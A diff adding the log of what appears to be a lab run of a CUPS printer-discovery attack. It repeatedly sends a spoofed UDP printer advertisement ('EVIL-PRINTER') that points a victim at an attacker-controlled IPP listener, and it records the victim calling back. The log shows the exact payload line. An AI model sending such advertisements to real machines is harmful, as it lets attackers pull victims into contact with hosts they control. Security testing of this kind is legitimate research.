@@ -1,0 +1,47 @@
+2026-11-16 17:35:32,340 INFO IPP callback listener up on 10.13.37.1:16322
+2026-11-16 17:35:32,641 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:32,641 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:32,666 WARNING >>> VICTIM CALLBACK: 10.13.37.10 connected and issued Get-Printer-Attributes (request-id=914) <<<
+2026-11-16 17:35:32,670 WARNING >>> VICTIM CALLBACK: 10.13.37.10 connected and issued Get-Printer-Attributes (request-id=915) <<<
+2026-11-16 17:35:32,870 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:32,871 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:33,081 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:33,081 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:33,293 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:33,293 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:33,504 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:33,505 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:33,718 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:33,718 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:33,929 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:33,929 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:34,147 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:34,148 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:34,361 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:34,361 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:34,573 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:34,574 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:34,785 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:34,786 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:35,009 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:35,010 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:35,236 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:35,236 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:35,445 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:35,445 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:35,659 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:35,659 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:35,870 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:35,870 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:36,081 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:36,081 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:36,295 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:36,295 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:36,513 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:36,513 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:36,725 INFO [flood] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (94 bytes) src_spoofed=False
+2026-11-16 17:35:36,726 DEBUG payload: b'0 3 ipp://10.13.37.1:16322/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:35:36,736 INFO waiting up to 6s for the victim to connect back...
+2026-11-16 17:35:44,195 INFO wrote 45 packets to pcap_files/attack_variant4_flood_kali.pcap
+2026-11-16 17:35:44,196 WARNING RESULT: victim DID connect back to the attacker-advertised printer -- insecure discovery confirmed (2 callback event(s))
+2026-11-16 17:35:44,196 INFO wrote run summary to evidence/attack_variant4_flood_kali_summary.json
